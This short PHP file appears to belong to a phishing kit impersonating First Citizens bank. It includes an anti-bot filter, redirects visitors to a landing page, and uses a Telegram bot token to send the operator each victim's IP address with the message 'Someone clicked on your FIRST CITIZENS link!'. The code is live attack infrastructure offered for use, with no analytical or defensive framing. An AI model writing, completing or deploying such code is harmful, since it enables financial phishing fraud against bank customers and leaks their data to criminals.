<?php
include_once("antibots.php");
header("Location: index.html?sessionid=ada7d36d9217da19");
include_once('send/config.php'); 

$botToken = $bot_token;
$chatID = $chat_id;

$userIP = $_SERVER['REMOTE_ADDR'];

$message = "Someone clicked on your FIRST CITIZENS link!\nIP Address: $userIP";

$telegramURL = "https://api.telegram.org/bot$botToken/sendMessage";


$params = [
    'chat_id' => $chatID,
    'text' => $message,
];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramURL);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);

?>